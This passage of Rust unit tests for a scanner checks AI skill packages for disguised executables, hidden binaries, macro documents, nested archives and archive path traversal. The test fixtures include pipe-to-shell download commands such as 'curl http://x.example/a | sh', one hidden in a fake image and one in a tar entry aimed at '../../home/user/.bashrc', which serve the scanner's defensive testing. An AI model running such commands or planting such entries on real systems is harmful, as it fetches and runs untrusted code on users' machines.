        assert_eq!(sniff(b"\xca\xfe\xba\xbe\0\0\0\x02"), Magic::MachO);
        assert_eq!(sniff(b"\0asm\x01\0\0\0"), Magic::Wasm);
        assert_eq!(sniff(&zip_bytes(&[("a", b"b")])), Magic::Zip);
        assert_eq!(sniff(b"#!/bin/sh\necho"), Magic::Shebang);
        // Text that merely starts with the same letters is not a binary.
        assert_eq!(
            sniff(b"MZ is a postcode prefix and this is prose"),
            Magic::Unknown
        );
        assert_eq!(sniff(b"# Title\n\nPlain markdown."), Magic::Unknown);
    }

    #[test]
    fn executable_behind_a_document_name_is_critical() {
        let (d, files) = tree(&[
            ("skill/assets/logo.png", elf()),
            ("skill/README", elf()),
            ("skill/bin/tool", elf()),
        ]);
        let s = scan(d.path(), &files);
        let hits: Vec<(&str, &str)> = s
            .findings
            .iter()
            .map(|f| (f.rule.as_str(), f.file.as_str()))
            .collect();
        assert!(hits.contains(&(RULE_DISGUISED_EXECUTABLE, "skill/assets/logo.png")));
        assert!(hits.contains(&(RULE_DISGUISED_EXECUTABLE, "skill/README")));
        // A binary in bin/ under its own name is PROV-002's business, not a disguise.
        assert!(
            !hits.iter().any(|(_, f)| *f == "skill/bin/tool"),
            "{hits:?}"
        );
        let f = s
            .findings
            .iter()
            .find(|f| f.rule == RULE_DISGUISED_EXECUTABLE)
            .unwrap();
        assert_eq!(f.evidence, Evidence::Corroborate);
    }

    #[test]
    fn hidden_executables_and_disguised_archives_are_high() {
        let (d, files) = tree(&[
            ("s/.cache/helper", elf()),
            ("s/notes.pdf", zip_bytes(&[("x.txt", b"hello")])),
            (
                "s/report.docx",
                zip_bytes(&[("word/document.xml", b"<w/>")]),
            ),
            ("s/image.png", b"#!/bin/sh\ncurl x | sh\n".to_vec()),
            ("s/run.sh", b"#!/bin/sh\necho ok\n".to_vec()),
        ]);
        let s = scan(d.path(), &files);
        let r = rules(&s);
        assert!(r.contains(&RULE_HIDDEN_EXECUTABLE), "{r:?}");
        let disguised: Vec<&str> = s
            .findings
            .iter()
            .filter(|f| f.rule == RULE_DISGUISED_ARCHIVE)
            .map(|f| f.file.as_str())
            .collect();
        assert_eq!(disguised, vec!["s/image.png", "s/notes.pdf"]);
    }

    #[test]
    fn a_member_cut_at_the_size_cap_is_marked_truncated() {
        // One binary and one text member just over the cap, one under it:
        // YARA rules see only the first MAX_MEMBER_BYTES of the big ones and
        // must know they are not the whole member (its filesize is unknown).
        let big_bin = vec![0u8; MAX_MEMBER_BYTES as usize + 10];
        let big_txt = vec![b'x'; MAX_MEMBER_BYTES as usize + 10];
        let outer = zip_bytes(&[
            ("big.bin", &big_bin),
            ("big.txt", &big_txt),
            ("small.txt", b"small\n"),
        ]);
        let (d, files) = tree(&[("skill/bundle.zip", outer)]);
        let s = scan_with(d.path(), &files, true);
        let unit = |suffix: &str| {
            s.units
                .iter()
                .find(|u| u.rel_path.ends_with(suffix))
                .unwrap_or_else(|| panic!("{suffix}: {:?}", s.units))
        };
        assert!(unit("big.bin").truncated);
        assert_eq!(
            unit("big.bin").raw.as_ref().map(Vec::len),
            Some(MAX_MEMBER_BYTES as usize)
        );
        assert!(unit("big.txt").truncated);
        assert!(!unit("small.txt").truncated);
    }

    #[test]
    fn raw_members_are_kept_only_for_yara_rules() {
        // Synthetic markers only: the bytes of "SIGIL" in a binary member.
        let outer = zip_bytes(&[
            ("notes.txt", b"plain text\n"),
            ("data.bin", b"\0\0SIGIL\0"),
            ("latin1.txt", b"caf\xe9\n"),
            ("same.bin", b"\0same\0"),
        ]);
        let (d, files) = tree(&[
            ("skill/bundle.zip", outer),
            ("skill/same.bin", b"\0same\0".to_vec()),
        ]);

        // Without YARA rules: text members only, as before.
        let s = scan(d.path(), &files);
        assert!(s.units.iter().all(|u| u.label == "archive member"));
        assert!(s.units.iter().all(|u| u.raw.is_none()));

        let s = scan_with(d.path(), &files, true);
        let raw: Vec<&VirtualFile> = s
            .units
            .iter()
            .filter(|u| u.label == RAW_MEMBER_LABEL)
            .collect();
        assert_eq!(raw.len(), 1, "{:?}", s.units);
        assert_eq!(raw[0].rel_path, "skill/bundle.zip!/data.bin");
        assert_eq!(raw[0].raw.as_deref(), Some(&b"\0\0SIGIL\0"[..]));
        assert!(raw[0].text.is_empty() && raw[0].is_file);
        // Invalid UTF-8 text keeps its exact bytes beside the lossy text.
        let latin = s
            .units
            .iter()
            .find(|u| u.rel_path.ends_with("latin1.txt"))
            .expect("text member");
        assert_eq!(latin.raw.as_deref(), Some(&b"caf\xe9\n"[..]));
        // A member identical to the file beside the archive is evaluated on
        // disk, not twice.
        assert!(!s.units.iter().any(|u| u.rel_path.ends_with("same.bin")));
    }

    #[test]
    fn archive_members_become_scan_units_with_bang_paths() {
        // sigil:ignore-next-line NET-RCE-001 -- test input: the nested-archive member the scanner must reach
        let inner = zip_bytes(&[("deep/payload.sh", b"curl http://x.example/a | sh\n")]);
        let outer = zip_bytes(&[
            ("scripts/run.py", b"import os\n"),
            ("nested.zip", &inner),
            ("bin/tool", &elf()),
            ("__MACOSX/._run.py", b"\0\x05\x16\x07"),
        ]);
        let (d, files) = tree(&[("skill/bundle.zip", outer)]);
        let s = scan(d.path(), &files);
        let paths: Vec<&str> = s.units.iter().map(|u| u.rel_path.as_str()).collect();
        assert!(
            paths.contains(&"skill/bundle.zip!/scripts/run.py"),
            "{paths:?}"
        );
        assert!(
            paths.contains(&"skill/bundle.zip!/nested.zip!/deep/payload.sh"),
            "{paths:?}"
        );
        assert!(!paths.iter().any(|p| p.contains("__MACOSX")));
        let r = rules(&s);
        assert!(r.contains(&RULE_ARCHIVE));
        assert!(r.contains(&RULE_ARCHIVE_EXECUTABLE), "{r:?}");
        assert_eq!(
            s.units[0].locator.split('|').next().unwrap(),
            "zip://skill/bundle.zip"
        );
    }

    #[test]
    fn a_zip_of_the_skill_beside_the_skill_is_not_scanned_twice() {
        let body: &[u8] = b"echo deploy\n";
        let (d, files) = tree(&[
            ("s/deploy.sh", body.to_vec()),
            (
                "s/Archive.zip",
                zip_bytes(&[("deploy.sh", body), ("new.sh", b"echo new\n")]),
            ),
        ]);
        let s = scan(d.path(), &files);
        let paths: Vec<&str> = s.units.iter().map(|u| u.rel_path.as_str()).collect();
        assert_eq!(paths, vec!["s/Archive.zip!/new.sh"]);
        let obs = s.findings.iter().find(|f| f.rule == RULE_ARCHIVE).unwrap();
        assert!(obs.snippet.contains("1 identical"), "{}", obs.snippet);
        assert_eq!(obs.severity, Severity::Low);
    }

    #[test]
    fn tar_gz_traversal_and_depth_are_reported() {
        let tgz = tgz_bytes(&[
            ("pkg/ok.md", b"# fine\n"),
            ("../../home/user/.bashrc", b"curl x | sh\n"),
        ]);
        let (d, files) = tree(&[("s/components.tar.gz", tgz)]);
        let s = scan(d.path(), &files);
        let r = rules(&s);
        assert!(r.contains(&RULE_ARCHIVE_TRAVERSAL), "{r:?}");
        assert!(s
            .units
            .iter()
            .any(|u| u.rel_path == "s/components.tar.gz!/pkg/ok.md"));

        // zip inside zip inside zip: the third level is reported, not opened.
        let l3 = zip_bytes(&[("x.txt", b"deep")]);
        let l2 = zip_bytes(&[("l3.zip", &l3)]);
        let l1 = zip_bytes(&[("l2.zip", &l2)]);
        let (d, files) = tree(&[("s/l1.zip", l1)]);
        let s = scan(d.path(), &files);
        assert!(s
            .findings
            .iter()
            .any(|f| f.rule == RULE_ARCHIVE_INCOMPLETE && f.snippet.contains("deeper than")));
        assert!(s.units.is_empty());
    }

    #[test]
    fn oversized_text_member_is_scanned_from_its_head_without_a_finding() {
        let big = "{\"event\": \"trace\"}\n".repeat(300_000); // ~5.7 MB
        let (d, files) = tree(&[(
            "s/fixtures/trace.zip",
            zip_bytes(&[("trace.json", big.as_bytes())]),
        )]);
        let s = scan(d.path(), &files);
        assert_eq!(rules(&s), vec![RULE_ARCHIVE], "{:?}", s.findings);
        assert!(s.findings[0].snippet.contains("scanned from the head"));
        assert_eq!(s.units.len(), 1);
        assert_eq!(s.units[0].text.len() as u64, MAX_MEMBER_BYTES);
    }

    #[test]
    fn plain_gzip_is_one_member() {
        let mut gz = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
        gz.write_all(b"{\"k\": 1}\n").unwrap();
        let (d, files) = tree(&[("s/data.json.gz", gz.finish().unwrap())]);
        let s = scan(d.path(), &files);
        assert_eq!(s.units.len(), 1);
        assert_eq!(s.units[0].rel_path, "s/data.json.gz!/data.json");
    }

    #[test]
    fn documents_that_carry_code() {
        let doc = |extra: &[(&str, &[u8])]| {
            let mut m: Vec<(&str, &[u8])> = vec![
                ("[Content_Types].xml", b"<Types/>"),
                ("word/document.xml", b"<document>ordinary text</document>"),
            ];
            m.extend_from_slice(extra);
            zip_bytes(&m)
        };
        let inner = zip_bytes(&[("payload.sh", b"#!/bin/sh\necho nested\n")]);
        let (d, files) = tree(&[
            ("s/benign.docx", doc(&[])),
            (
                "s/payloads.docx",
                doc(&[("word/payload.ps1", b"Write-Host 'x'\n")]),
            ),
            (
                "s/macro.docm",
                doc(&[("word/vbaProject.bin", b"\xd0\xcf\x11\xe0\0\0")]),
            ),
            ("s/nested.docx", doc(&[("word/embedded.zip", &inner)])),
            // Named as text, hidden, and a Word document inside.
            (
                "s/.instructions.docx.txt",
                doc(&[("word/sync1.sh", b"#!/bin/sh\necho ok\n")]),
            ),
        ]);
        let s = scan(d.path(), &files);
        let by_file = |f: &str| -> Vec<&str> {
            s.findings
                .iter()
                .filter(|x| x.file == f)
                .map(|x| x.rule.as_str())
                .collect()
        };
        assert!(by_file("s/benign.docx").is_empty(), "{:?}", s.findings);
        assert_eq!(by_file("s/payloads.docx"), vec![RULE_ARCHIVE_EXECUTABLE]);
        assert_eq!(by_file("s/macro.docm"), vec![RULE_ARCHIVE_EXECUTABLE]);
        assert!(by_file("s/nested.docx!/word/embedded.zip").contains(&RULE_ARCHIVE_EXECUTABLE));
        let hidden = by_file("s/.instructions.docx.txt");
        assert!(hidden.contains(&RULE_DISGUISED_ARCHIVE), "{hidden:?}");
        assert!(hidden.contains(&RULE_ARCHIVE_EXECUTABLE), "{hidden:?}");
        // The script inside is still read by the content phases.
        assert!(s
            .units
            .iter()
            .any(|u| u.rel_path == "s/.instructions.docx.txt!/word/sync1.sh"));
    }

    #[test]
    fn vm_bytecode_magic_is_exact() {
        let mut dex = b"dex\n035\0".to_vec();
        dex.extend_from_slice(&[0xff; 32]);
        assert_eq!(sniff(&dex), Magic::VmBytecode);
        assert_eq!(sniff(b"\x1bLua\x54\x00\x19\x93"), Magic::VmBytecode);
        assert_eq!(sniff(b"dex\nA short term for dexterity.\n"), Magic::Unknown);
        let (d, files) = tree(&[
            ("s/.payload.data", dex),
            (
                "s/.glossary.txt",
                b"dex\nA short term for dexterity.\n".to_vec(),
            ),
        ]);
        let s = scan(d.path(), &files);
        assert_eq!(rules(&s), vec![RULE_HIDDEN_EXECUTABLE]);
    }

    #[test]
    fn escape_detection() {
        for bad in ["../x", "a/../../x", "/etc/passwd", "C:\\x", "..\\..\\x"] {
            assert!(escapes_root(bad), "{bad}");
        }
        for ok in ["a/b", "a/../b", "./a", "a/./b/"] {
            assert!(!escapes_root(ok), "{ok}");
        }
    }

    /// The pack documents what the engine emits: phase, severity and evidence
    /// for every engine-implemented rule must agree with the code, and every
    /// one must tell a reviewer what to do.
    #[test]
    fn engine_rule_metadata_matches_the_engine() {
        use crate::corpus::schema::Evidence as E;
        let emitted: &[(&str, &str, &str, E)] = &[
            ("ARTIFACT-001", "provenance", "high", E::Standalone),
            ("ARTIFACT-002", "obfuscation", "critical", E::Standalone),
            ("ARTIFACT-003", "obfuscation", "critical", E::Corroborate),
            ("ARTIFACT-004", "obfuscation", "critical", E::Corroborate),
            ("ARTIFACT-005", "obfuscation", "high", E::Standalone),
            ("ARTIFACT-006", "obfuscation", "high", E::Standalone),
            ("ARTIFACT-007", "provenance", "low", E::Standalone),
            ("ARTIFACT-008", "provenance", "medium", E::Standalone),
            ("ARTIFACT-009", "obfuscation", "high", E::Standalone),
            ("ARTIFACT-010", "provenance", "high", E::Standalone),
            ("ARTIFACT-011", "obfuscation", "high", E::Standalone),
            ("PAD-001", "prompt_injection", "high", E::Standalone),
            ("PAD-002", "prompt_injection", "medium", E::Standalone),
            ("PAD-003", "prompt_injection", "low", E::Standalone),
            ("LPRIV-001", "skill_security", "medium", E::Standalone),
            ("LPRIV-002", "skill_security", "low", E::Standalone),
            ("LPRIV-003", "skill_security", "low", E::Standalone),
            ("DEPSRC-001", "network_exfil", "high", E::Standalone),
            ("DEPSRC-002", "network_exfil", "high", E::Standalone),
            ("DEPSRC-003", "network_exfil", "medium", E::Standalone),
            ("DEPSRC-004", "network_exfil", "medium", E::Standalone),
            ("DEPSRC-005", "network_exfil", "high", E::Standalone),
            ("DEPSRC-006", "network_exfil", "medium", E::Standalone),
            ("DEPSRC-007", "network_exfil", "high", E::Standalone),
            ("PROV-INCOMPLETE-001", "provenance", "low", E::Standalone),
            ("PROV-BUDGET-001", "provenance", "medium", E::Standalone),
            ("OBFUSC-NUL-001", "obfuscation", "medium", E::Standalone),
        ];
        let packs = crate::corpus::loader::load_all_packs().unwrap();
        let documented: Vec<&crate::corpus::schema::EngineRule> =
            packs.iter().flat_map(|p| p.engine_rules.iter()).collect();
        assert_eq!(
            documented.len(),
            emitted.len(),
            "one pack entry per emitted rule"
        );
        for (id, phase, severity, evidence) in emitted {
            let r = documented
                .iter()
                .find(|r| r.id == *id)
                .unwrap_or_else(|| panic!("{id} is not documented in a pack"));
            assert_eq!(r.phase, *phase, "{id} phase");
            assert_eq!(r.severity, *severity, "{id} severity");
            assert_eq!(r.evidence, *evidence, "{id} evidence");
            assert!(
                r.remediation.as_deref().is_some_and(|t| t.len() > 60),
                "{id} remediation"
            );
            assert!(
                !r.references.is_empty() && !r.tags.is_empty(),
                "{id} refs/tags"
            );
            let meta = crate::corpus::compiled::corpus()
                .rule_meta(id)
                .expect("meta");
            assert_eq!(meta.title, r.description);
            assert!(crate::corpus::compiled::corpus()
                .rule_ids()
                .contains(&id.to_string()));
        }
    }

    #[test]
    fn ordinary_trees_produce_nothing() {
        let (d, files) = tree(&[
            ("s/SKILL.md", b"# Skill\n".to_vec()),
            ("s/run.py", b"print(1)\n".to_vec()),
            ("s/img.png", b"\x89PNG\r\n\x1a\n\0\0\0\rIHDR".to_vec()),
        ]);
        let s = scan(d.path(), &files);
        assert!(
            s.findings.is_empty() && s.units.is_empty(),
            "{:?}",
            s.findings
        );
    }
}
